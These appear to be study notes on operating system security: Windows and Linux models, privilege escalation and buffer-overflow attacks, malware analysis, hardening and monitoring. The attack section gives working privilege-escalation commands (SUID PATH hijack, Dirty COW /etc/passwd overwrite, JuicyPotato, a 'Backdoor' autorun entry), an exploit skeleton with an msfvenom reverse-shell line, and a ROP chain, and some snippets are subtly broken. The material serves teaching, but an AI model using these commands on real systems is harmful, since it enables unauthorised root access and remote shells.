# Detailed Notes: System Security

## Operating System Security Architecture

### Windows Security Model - Deep Analysis

#### Windows Security Architecture Components

**1. Security Reference Monitor (SRM)**
- Kernel-mode component enforcing access control
- Validates all access requests
- Audits security-relevant events
- Maintains security policy database

**2. Local Security Authority (LSA)**
- User authentication services
- Security policy management
- Audit policy enforcement
- Token generation and validation

**3. Security Account Manager (SAM)**
- Local user account database
- Password hash storage
- Account lockout policies
- Local group memberships

#### Active Directory Security

**Domain Structure:**
```
Forest: contoso.com
├── Domain: corp.contoso.com
│   ├── OU: Servers
│   ├── OU: Workstations
│   └── OU: Users
└── Domain: dev.contoso.com
    ├── OU: Development
    └── OU: Testing
```

**Authentication Protocols:**
1. **NTLM (NT LAN Manager)**
   - Challenge-response authentication
   - Vulnerable to pass-the-hash attacks
   - Still used for backward compatibility

2. **Kerberos**
   - Ticket-based authentication
   - Mutual authentication
   - More secure than NTLM

**Kerberos Authentication Process:**
```
1. Client → KDC: Authentication Server Request (AS-REQ)
2. KDC → Client: Authentication Server Response (AS-REP) with TGT
3. Client → KDC: Ticket Granting Server Request (TGS-REQ)
4. KDC → Client: Ticket Granting Server Response (TGS-REP) with Service Ticket
5. Client → Service: Application Request (AP-REQ) with Service Ticket
6. Service → Client: Application Response (AP-REP)
```

#### Group Policy Security

**Security Settings Categories:**
1. **Account Policies**
   - Password policies
   - Account lockout policies
   - Kerberos policies

2. **Local Policies**
   - Audit policies
   - User rights assignments
   - Security options

3. **Event Log Policies**
   - Log retention settings
   - Maximum log sizes
   - Access permissions

**Example Security Configurations:**
```powershell
# PowerShell DSC for security hardening
Configuration WindowsHardening {
    param(
        [string[]]$ComputerName = 'localhost'
    )
    
    Import-DscResource -ModuleName PSDesiredStateConfiguration
    
    Node $ComputerName {
        Registry DisableAutoRun {
            Key = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer'
            ValueName = 'NoDriveTypeAutoRun'
            ValueData = '255'
            ValueType = 'DWord'
        }
        
        Registry DisableGuest {
            Key = 'HKLM:\SAM\SAM\Domains\Account\Users\000001F5'
            ValueName = 'F'
            Ensure = 'Present'
        }
    }
}
```

#### Windows Registry Security

**Security-Critical Registry Keys:**
```
# Auto-start locations
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Service configurations
HKLM\SYSTEM\CurrentControlSet\Services

# Security policies
HKLM\SECURITY\Policy

# SAM database
HKLM\SAM\SAM\Domains\Account\Users
```

### Linux Security Model - Comprehensive Analysis

#### Linux Security Architecture

**1. Discretionary Access Control (DAC)**
```bash
# File permissions (rwx for user, group, other)
chmod 755 /path/to/file    # rwxr-xr-x
chmod 644 /path/to/file    # rw-r--r--
chmod 600 /path/to/file    # rw-------

# Advanced permissions
chmod u+s /path/to/file    # Set SUID bit
chmod g+s /path/to/file    # Set SGID bit
chmod +t /path/to/directory # Set sticky bit
```

**2. Mandatory Access Control (MAC)**

**SELinux (Security-Enhanced Linux):**
```bash
# SELinux modes
getenforce                 # Get current mode
setenforce 0              # Set to permissive
setenforce 1              # Set to enforcing

# Context management
ls -Z /path/to/file       # View SELinux context
chcon -t httpd_exec_t /path/to/file  # Change context
restorecon /path/to/file  # Restore default context

# Policy management
setsebool -P httpd_can_network_connect on
getsebool -a | grep httpd
```

**AppArmor:**
```bash
# Profile management
aa-status                 # Show AppArmor status
aa-enforce /etc/apparmor.d/usr.bin.firefox
aa-complain /etc/apparmor.d/usr.bin.firefox
aa-disable /etc/apparmor.d/usr.bin.firefox

# Profile development
aa-genprof /path/to/binary
aa-logprof                # Update profiles based on logs
```

#### Linux Authentication and Authorization

**PAM (Pluggable Authentication Modules):**
```bash
# PAM configuration files
/etc/pam.d/login         # Console login
/etc/pam.d/sshd          # SSH authentication
/etc/pam.d/sudo          # Sudo authentication
/etc/pam.d/common-auth   # Common authentication

# Example PAM configuration
# /etc/pam.d/sshd
auth       required     pam_env.so
auth       required     pam_unix.so
account    required     pam_unix.so
password   required     pam_unix.so
session    required     pam_unix.so
```

**User and Group Management:**
```bash
# User management
useradd -m -s /bin/bash username
usermod -aG sudo username
userdel -r username
passwd username

# Group management
groupadd groupname
usermod -aG groupname username
gpasswd -d username groupname

# Sudo configuration
visudo                    # Edit sudoers file safely
# Example sudoers entry
username ALL=(ALL:ALL) ALL
%admin ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart apache2
```

### Common System Attacks - Detailed Analysis

#### Privilege Escalation Attacks

**1. Linux Privilege Escalation**

**SUID/SGID Exploitation:**
```bash
# Find SUID/SGID binaries
find / -perm -4000 -type f 2>/dev/null  # SUID
find / -perm -2000 -type f 2>/dev/null  # SGID

# Common vulnerable SUID binaries
/bin/ping
/usr/bin/passwd
/usr/bin/sudo
/bin/su

# Example: Exploiting vulnerable SUID binary
# If a custom SUID binary doesn't sanitize PATH
export PATH=/tmp:$PATH
echo '#!/bin/bash' > /tmp/ls
echo '/bin/bash' >> /tmp/ls
chmod +x /tmp/ls
./vulnerable_suid_binary  # If it calls 'ls' without full path
```

**Kernel Exploits:**
```bash
# Kernel version enumeration
uname -a
cat /proc/version
cat /etc/issue

# Check for known vulnerabilities
searchsploit linux kernel $(uname -r)

# Example: Dirty COW exploit (CVE-2016-5195)
# Affects Linux kernel versions 2.6.22 through 4.8.3
gcc -pthread dirty_cow.c -o dirty_cow
./dirty_cow /etc/passwd "root:$(openssl passwd -1 newpassword):0:0:root:/root:/bin/bash"
```

**Cron Job Exploitation:**
```bash
# Enumerate cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Check for writable scripts in cron jobs
find /etc/cron* -type f -writable 2>/dev/null

# Example: Exploiting writable cron script
echo '#!/bin/bash' > /tmp/exploit.sh
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' >> /tmp/exploit.sh
# If cron script includes /tmp/exploit.sh or is writable
```

**2. Windows Privilege Escalation**

**Token Impersonation:**
```powershell
# Check current privileges
whoami /priv

# Enable specific privileges
.\EnableAllTokenPrivs.exe

# Token impersonation attack
# If SeImpersonatePrivilege is enabled
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami > c:\temp\whoami.txt" -t *
```

**Unquoted Service Path Exploitation:**
```powershell
# Find services with unquoted paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Example vulnerable service path:
# C:\Program Files\Vulnerable Service\service.exe
# Create malicious executable at:
# C:\Program.exe or C:\Program Files\Vulnerable.exe

# PowerShell to find and exploit
Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notlike '*"*' -and $_.PathName -like '* *'} | Select Name, PathName
```

**Registry Autorun Exploitation:**
```powershell
# Check autorun locations
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Add malicious autorun entry (if writable)
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Backdoor" /t REG_SZ /d "C:\temp\backdoor.exe"
```

#### Buffer Overflow Attacks

**1. Stack-Based Buffer Overflow**

**Vulnerable C Code Example:**
```c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[100];
    strcpy(buffer, input);  // No bounds checking
    printf("Buffer contents: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    vulnerable_function(argv[1]);
    return 0;
}
```

**Exploitation Process:**
```python
# Buffer overflow exploit development
import struct

# Step 1: Find buffer size and offset to return address
payload = "A" * 112  # Buffer + saved EBP
payload += "BBBB"    # Return address (4 bytes on 32-bit)

# Step 2: Find bad characters
bad_chars = "\x00\x0a\x0d"  # NULL, newline, carriage return

# Step 3: Find JMP ESP instruction
# Use msfvenom or immunity debugger
jmp_esp_addr = 0x625011af

# Step 4: Generate shellcode
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f python -b "\x00\x0a\x0d"

# Step 5: Final exploit
buffer = "A" * 112
eip = struct.pack("<I", jmp_esp_addr)
nop_sled = "\x90" * 16
shellcode = "\xfc\x48\x83..."  # Generated shellcode

exploit = buffer + eip + nop_sled + shellcode
```

**2. Heap-Based Buffer Overflow**

**Heap Exploitation Concepts:**
```c
// Vulnerable heap allocation
#include <stdlib.h>
#include <string.h>

int main() {
    char *buffer1 = malloc(100);
    char *buffer2 = malloc(100);
    
    // Overflow buffer1 into buffer2's metadata
    strcpy(buffer1, "A" * 200);  // Overflows into heap metadata
    
    free(buffer1);
    free(buffer2);  // Can be exploited due to corrupted metadata
    return 0;
}
```

**3. Return-Oriented Programming (ROP)**

**ROP Chain Construction:**
```python
# ROP gadget finding with ropper
# ropper --file vulnerable_binary --search "pop rdi"

# Example ROP chain
rop_chain = struct.pack("<Q", 0x400686)  # pop rdi; ret
rop_chain += struct.pack("<Q", 0x601030)  # address of "/bin/sh"
rop_chain += struct.pack("<Q", 0x400560)  # system() function

# Full exploit with ROP
payload = "A" * offset_to_ret
payload += rop_chain
```

#### Malware Analysis and Detection

**1. Static Analysis Techniques**

**File Analysis:**
```bash
# File information
file malware_sample
hexdump -C malware_sample | head -20
strings malware_sample

# PE analysis (Windows)
pecheck malware_sample.exe
pestudio malware_sample.exe

# ELF analysis (Linux)
readelf -h malware_sample
objdump -d malware_sample
```

**Hash Analysis:**
```bash
# Generate hashes
md5sum malware_sample
sha256sum malware_sample

# VirusTotal lookup
curl -X POST 'https://www.virustotal.com/vtapi/v2/file/scan' \
  -F 'key=YOUR_API_KEY' \
  -F 'file=@malware_sample'
```

**2. Dynamic Analysis Techniques**

**Sandbox Analysis:**
```bash
# Network monitoring
tcpdump -i any -w traffic.pcap
wireshark traffic.pcap

# File system monitoring
inotifywait -m -r /path/to/monitor

# Process monitoring
strace -p PID  # Linux
procmon.exe    # Windows (Sysinternals)
```

**Behavioral Analysis:**
```python
# Python script for behavioral monitoring
import psutil
import time

def monitor_processes():
    initial_processes = set(p.pid for p in psutil.process_iter())
    
    # Run malware sample here
    
    time.sleep(60)  # Monitor for 1 minute
    
    current_processes = set(p.pid for p in psutil.process_iter())
    new_processes = current_processes - initial_processes
    
    for pid in new_processes:
        try:
            process = psutil.Process(pid)
            print(f"New process: {process.name()} (PID: {pid})")
            print(f"Command line: {process.cmdline()}")
            print(f"Connections: {process.connections()}")
        except psutil.NoSuchProcess:
            pass
```

### System Hardening - Comprehensive Guide

#### Windows Hardening

**1. Security Configuration**

**Local Security Policy:**
```
# Security Options
Network access: Do not allow anonymous enumeration of SAM accounts = Enabled
Network access: Do not allow anonymous enumeration of shares = Enabled
Network security: Do not store LAN Manager hash value = Enabled
Network security: LAN Manager authentication level = Send NTLMv2 only\refuse LM & NTLM

# Audit Policy
Audit account logon events = Success, Failure
Audit logon events = Success, Failure
Audit object access = Failure
Audit privilege use = Failure
Audit process tracking = No auditing
Audit policy change = Success, Failure
Audit system events = Success, Failure
```

**Windows Services Hardening:**
```powershell
# Disable unnecessary services
$services_to_disable = @(
    'Fax',
    'TelnetD',
    'RemoteRegistry',
    'Messenger',
    'NetMeeting Remote Desktop Sharing'
)

foreach ($service in $services_to_disable) {
    Set-Service -Name $service -StartupType Disabled -ErrorAction SilentlyContinue
    Stop-Service -Name $service -Force -ErrorAction SilentlyContinue
}

# Configure secure services
Set-Service -Name 'EventLog' -StartupType Automatic
Set-Service -Name 'Windows Firewall' -StartupType Automatic
```

**2. Windows Firewall Configuration**

```powershell
# Enable Windows Firewall
netsh advfirewall set allprofiles state on

# Block all inbound by default
netsh advfirewall set allprofiles firewallpolicy blockinbound,allowoutbound

# Allow specific services
netsh advfirewall firewall add rule name="Allow SSH" dir=in action=allow protocol=TCP localport=22
netsh advfirewall firewall add rule name="Allow RDP" dir=in action=allow protocol=TCP localport=3389

# Block dangerous ports
netsh advfirewall firewall add rule name="Block Telnet" dir=in action=block protocol=TCP localport=23
netsh advfirewall firewall add rule name="Block FTP" dir=in action=block protocol=TCP localport=21
```

#### Linux Hardening

**1. System Configuration**

**Kernel Parameters:**
```bash
# /etc/sysctl.conf security settings
# Network security
net.ipv4.ip_forward = 0
net.ipv4.conf.all.send_redirects = 0
net.ipv4.conf.default.send_redirects = 0
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.default.accept_redirects = 0
net.ipv4.conf.all.accept_source_route = 0
net.ipv4.conf.default.accept_source_route = 0

# Memory protection
kernel.exec-shield = 1
kernel.randomize_va_space = 2

# Apply changes
sysctl -p
```

**File System Security:**
```bash
# Mount options for security
# /etc/fstab
/dev/sda1 /home ext4 defaults,nodev,nosuid 0 2
tmpfs /tmp tmpfs defaults,nodev,nosuid,noexec 0 0
tmpfs /var/tmp tmpfs defaults,nodev,nosuid,noexec 0 0

# Set proper permissions
chmod 700 /root
chmod 755 /etc/passwd
chmod 640 /etc/shadow
chmod 600 /etc/gshadow

# Remove world-writable files
find / -type f -perm -002 -exec chmod o-w {} \;
find / -type d -perm -002 -exec chmod o-w {} \;
```

**2. Service Hardening**

**SSH Hardening:**
```bash
# /etc/ssh/sshd_config
Protocol 2
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
PermitEmptyPasswords no
X11Forwarding no
UsePAM yes
MaxAuthTries 3
LoginGraceTime 30
MaxSessions 2
AllowUsers username1 username2
DenyUsers root

# Restart SSH service
systemctl restart sshd
```

**Apache Hardening:**
```apache
# /etc/apache2/conf-available/security.conf
ServerTokens Prod
ServerSignature Off

# Hide version information
Header always set X-Content-Type-Options nosniff
Header always set X-Frame-Options DENY
Header always set X-XSS-Protection "1; mode=block"

# Disable unnecessary modules
a2dismod autoindex
a2dismod status
a2dismod info

# SSL/TLS configuration
SSLProtocol all -SSLv2 -SSLv3 -TLSv1 -TLSv1.1
SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256
SSLHonorCipherOrder on
```

#### Logging and Monitoring

**1. Windows Event Logging**

**PowerShell Logging Configuration:**
```powershell
# Enable PowerShell script block logging
$regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
New-Item -Path $regPath -Force
Set-ItemProperty -Path $regPath -Name "EnableScriptBlockLogging" -Value 1

# Enable PowerShell transcription
$regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription"
New-Item -Path $regPath -Force
Set-ItemProperty -Path $regPath -Name "EnableTranscripting" -Value 1
Set-ItemProperty -Path $regPath -Name "OutputDirectory" -Value "C:\PSTranscripts"
```

**2. Linux Logging Configuration**

**Syslog Configuration:**
```bash
# /etc/rsyslog.conf
# Log authentication attempts
auth,authpriv.*                 /var/log/auth.log

# Log cron activities
cron.*                          /var/log/cron.log

# Log kernel messages
kern.*                          /var/log/kern.log

# Forward logs to central server
*.* @@192.168.1.100:514

# Restart rsyslog
systemctl restart rsyslog
```

**Auditd Configuration:**
```bash
# /etc/audit/rules.d/audit.rules
# Monitor file access
-w /etc/passwd -p wa -k identity
-w /etc/group -p wa -k identity
-w /etc/shadow -p wa -k identity

# Monitor system calls
-a always,exit -F arch=b64 -S adjtimex,settimeofday -k time-change
-a always,exit -F arch=b32 -S adjtimex,settimeofday,stime -k time-change

# Monitor network configuration
-w /etc/issue -p wa -k system-locale
-w /etc/issue.net -p wa -k system-locale
-w /etc/hosts -p wa -k system-locale

# Start auditd
systemctl enable auditd
systemctl start auditd
```

### Advanced System Security Topics

#### Container Security

**Docker Security Best Practices:**
```dockerfile
# Use minimal base images
FROM alpine:3.14

# Don't run as root
RUN addgroup -g 1001 appgroup && adduser -u 1001 -G appgroup -s /bin/sh -D appuser
USER appuser

# Use specific versions
RUN apk add --no-cache nginx=1.20.1-r3

# Set read-only filesystem
# docker run --read-only --tmpfs /tmp myapp
```

**Kubernetes Security:**
```yaml
# Pod Security Policy
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: restricted
spec:
  privileged: false
  allowPrivilegeEscalation: false
  requiredDropCapabilities:
    - ALL
  volumes:
    - 'configMap'
    - 'emptyDir'
    - 'projected'
    - 'secret'
    - 'downwardAPI'
    - 'persistentVolumeClaim'
  runAsUser:
    rule: 'MustRunAsNonRoot'
  seLinux:
    rule: 'RunAsAny'
  fsGroup:
    rule: 'RunAsAny'
```

#### Endpoint Detection and Response (EDR)

**Host-Based Intrusion Detection:**
```python
# Python-based file integrity monitoring
import hashlib
import json
import time
import os

class FileIntegrityMonitor:
    def __init__(self, monitored_paths):
        self.monitored_paths = monitored_paths
        self.baseline = {}
        self.create_baseline()
    
    def create_baseline(self):
        for path in self.monitored_paths:
            if os.path.exists(path):
                with open(path, 'rb') as f:
                    file_hash = hashlib.sha256(f.read()).hexdigest()
                    self.baseline[path] = file_hash
    
    def check_integrity(self):
        alerts = []
        for path, baseline_hash in self.baseline.items():
            if os.path.exists(path):
                with open(path, 'rb') as f:
                    current_hash = hashlib.sha256(f.read()).hexdigest()
                    if current_hash != baseline_hash:
                        alerts.append(f"File modified: {path}")
            else:
                alerts.append(f"File deleted: {path}")
        return alerts

# Usage
monitor = FileIntegrityMonitor([
    '/etc/passwd',
    '/etc/shadow',
    '/etc/hosts'
])

while True:
    alerts = monitor.check_integrity()
    for alert in alerts:
        print(f"ALERT: {alert}")
    time.sleep(60)
```
